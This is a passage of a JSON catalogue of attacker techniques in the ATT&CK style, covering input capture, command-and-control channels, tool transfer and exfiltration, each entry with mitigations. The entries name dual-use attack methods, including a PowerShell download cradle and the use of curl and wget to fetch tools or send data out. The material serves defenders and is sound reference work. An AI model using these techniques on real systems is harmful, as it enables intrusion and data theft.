      { "id": "T1056.001", "name": "Keylogging" },
      { "id": "T1056.002", "name": "GUI Input Capture" },
      { "id": "T1056.003", "name": "Web Portal Capture" },
      { "id": "T1056.004", "name": "Credential API Hooking" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture)."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1113",
    "name": "Screen Capture",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as "
        },
        { "type": "code", "content": "CopyFromScreen" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "xwd" },
        { "type": "text", "content": ", or " },
        { "type": "code", "content": "screencapture" },
        { "type": "text", "content": "." }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1125",
    "name": "Video Capture",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files."
        }
      ],
      [
        {
          "type": "text",
          "content": "Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen."
        }
      ],
      [
        {
          "type": "text",
          "content": "In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. "
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1071",
    "name": "Application Layer Protocol",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [
      { "id": "T1071.001", "name": "Web Protocols" },
      { "id": "T1071.002", "name": "File Transfer Protocols" },
      { "id": "T1071.003", "name": "Mail Protocols" },
      { "id": "T1071.004", "name": "DNS" }
    ],
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1092",
    "name": "Communication Through Removable Media",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable Autoruns if it is unnecessary."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Disallow or restrict removable media at an organizational policy level if they are not required for business operations."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1659",
    "name": "Content Injection",
    "tactics": [
      { "id": "TA0001", "name": "Initial Access" },
      { "id": "TA0011", "name": "Command and Control" }
    ],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may inject content to victim systems in various ways, including:"
        }
      ],
      [
        {
          "type": "li",
          "content": "From the middle, where the adversary is in-between legitimate online client-server communications (Note: this is similar but distinct from Adversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment)"
        },
        {
          "type": "li",
          "content": "From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server"
        }
      ],
      [
        {
          "type": "text",
          "content": "Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\""
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Where possible, ensure that online traffic is appropriately encrypted through services such as trusted VPNs."
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "Restrict Web-Based Content",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider blocking download/transfer and execution of potentially uncommon file types known to be used in adversary campaigns."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1132",
    "name": "Data Encoding",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [
      { "id": "T1132.001", "name": "Standard Encoding" },
      { "id": "T1132.002", "name": "Non-Standard Encoding" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.  Some data encoding systems may also result in data compression, such as gzip."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1001",
    "name": "Data Obfuscation",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [
      { "id": "T1001.001", "name": "Junk Data" },
      { "id": "T1001.002", "name": "Steganography" },
      { "id": "T1001.003", "name": "Protocol Impersonation" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate some obfuscation activity at the network level."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1568",
    "name": "Dynamic Resolution",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [
      { "id": "T1568.001", "name": "Fast Flux DNS" },
      { "id": "T1568.002", "name": "Domain Generation Algorithms" },
      { "id": "T1568.003", "name": "DNS Calculation" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Malware researchers can reverse engineer malware variants that use dynamic resolution and determine future C2 infrastructure that the malware will attempt to contact, but this is a time and resource intensive effort."
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "Restrict Web-Based Content",
        "description": [
          [
            {
              "type": "text",
              "content": "In some cases a local DNS sinkhole may be used to help prevent behaviors associated with dynamic resolution."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1573",
    "name": "Encrypted Channel",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [
      { "id": "T1573.001", "name": "Symmetric Cryptography" },
      { "id": "T1573.002", "name": "Asymmetric Cryptography" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."
            }
          ]
        ]
      },
      {
        "id": "M1020",
        "name": "SSL/TLS Inspection",
        "description": [
          [
            {
              "type": "text",
              "content": "SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1008",
    "name": "Fallback Channels",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1105",
    "name": "Ingress Tool Transfer",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [],
    "version": "2.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). "
        }
      ],
      [
        {
          "type": "text",
          "content": "On Windows, adversaries may use various utilities to download tools, such as "
        },
        { "type": "code", "content": "copy" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "finger" },
        {
          "type": "text",
          "content": ", certutil, and PowerShell commands such as "
        },
        {
          "type": "code",
          "content": "IEX(New-Object Net.WebClient).downloadString()"
        },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "Invoke-WebRequest" },
        {
          "type": "text",
          "content": ". On Linux and macOS systems, a variety of utilities also exist, such as "
        },
        { "type": "code", "content": "curl" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "scp" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "sftp" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "tftp" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "rsync" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "finger" },
        { "type": "text", "content": ", and " },
        { "type": "code", "content": "wget" },
        { "type": "text", "content": "." }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also abuse installers and package managers, such as "
        },
        { "type": "code", "content": "yum" },
        { "type": "text", "content": " or " },
        { "type": "code", "content": "winget" },
        { "type": "text", "content": ", to download tools to victim hosts." }
      ],
      [
        {
          "type": "text",
          "content": "Files can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1104",
    "name": "Multi-Stage Channels",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult."
        }
      ],
      [
        {
          "type": "text",
          "content": "Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features."
        }
      ],
      [
        {
          "type": "text",
          "content": "The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1095",
    "name": "Non-Application Layer Protocol",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [],
    "version": "2.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL)."
        }
      ],
      [
        {
          "type": "text",
          "content": "ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Filter network traffic to prevent use of protocols across the network boundary that are unnecessary."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1571",
    "name": "Non-Standard Port",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports for that particular network segment."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1572",
    "name": "Protocol Tunneling",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. "
        }
      ],
      [
        {
          "type": "text",
          "content": "There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Protocol Tunneling may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider filtering network traffic to untrusted or known bad domains and resources. "
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1090",
    "name": "Proxy",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [
      { "id": "T1090.001", "name": "Internal Proxy" },
      { "id": "T1090.002", "name": "External Proxy" },
      { "id": "T1090.003", "name": "Multi-hop Proxy" },
      { "id": "T1090.004", "name": "Domain Fronting" }
    ],
    "version": "3.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network allow and block lists. It should be noted that this kind of blocking may be circumvented by other techniques like Domain Fronting."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. "
            }
          ]
        ]
      },
      {
        "id": "M1020",
        "name": "SSL/TLS Inspection",
        "description": [
          [
            {
              "type": "text",
              "content": "If it is possible to inspect HTTPS traffic, the captures can be analyzed for connections that appear to be domain fronting."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1219",
    "name": "Remote Access Software",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as "
        },
        { "type": "code", "content": "VNC" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "Team Viewer" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "AnyDesk" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "ScreenConnect" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "LogMein" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "AmmyyAdmin" },
        {
          "type": "text",
          "content": ", and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment."
        }
      ],
      [
        {
          "type": "text",
          "content": "Remote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access."
        }
      ],
      [
        {
          "type": "text",
          "content": "Installation of many remote access software may also include persistence (e.g., the software's installation routine creates a Windows Service)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Use application control to mitigate installation and use of unapproved software that can be used for remote access."
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Properly configure firewalls, application firewalls, and proxies to limit outgoing traffic to sites and services used by remote access software."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1205",
    "name": "Traffic Signaling",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0011", "name": "Command and Control" }
    ],
    "subs": [
      { "id": "T1205.001", "name": "Port Knocking" },
      { "id": "T1205.002", "name": "Socket Filters" }
    ],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s)."
        }
      ],
      [
        {
          "type": "text",
          "content": "The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs."
        }
      ],
      [
        {
          "type": "text",
          "content": "On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable Wake-on-LAN if it is not needed within an environment."
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1102",
    "name": "Web Service",
    "tactics": [{ "id": "TA0011", "name": "Command and Control" }],
    "subs": [
      { "id": "T1102.001", "name": "Dead Drop Resolver" },
      { "id": "T1102.002", "name": "Bidirectional Communication" },
      { "id": "T1102.003", "name": "One-Way Communication" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection."
        }
      ],
      [
        {
          "type": "text",
          "content": "Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "Restrict Web-Based Content",
        "description": [
          [
            {
              "type": "text",
              "content": "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1020",
    "name": "Automated Exfiltration",
    "tactics": [{ "id": "TA0010", "name": "Exfiltration" }],
    "subs": [{ "id": "T1020.001", "name": "Traffic Duplication" }],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. "
        }
      ],
      [
        {
          "type": "text",
          "content": "When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1030",
    "name": "Data Transfer Size Limits",
    "tactics": [{ "id": "TA0010", "name": "Exfiltration" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1048",
    "name": "Exfiltration Over Alternative Protocol",
    "tactics": [{ "id": "TA0010", "name": "Exfiltration" }],
    "subs": [
      {
        "id": "T1048.001",
        "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
      },
      {
        "id": "T1048.002",
        "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
      },
      {
        "id": "T1048.003",
        "name": "Exfiltration Over Unencrypted Non-C2 Protocol"
      }
    ],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  "
        }
      ],
      [
        {
          "type": "text",
          "content": "Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Exfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux "
        },
        { "type": "code", "content": "curl" },
        {
          "type": "text",
          "content": " may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system."
        }
      ],
      [
        {
          "type": "text",
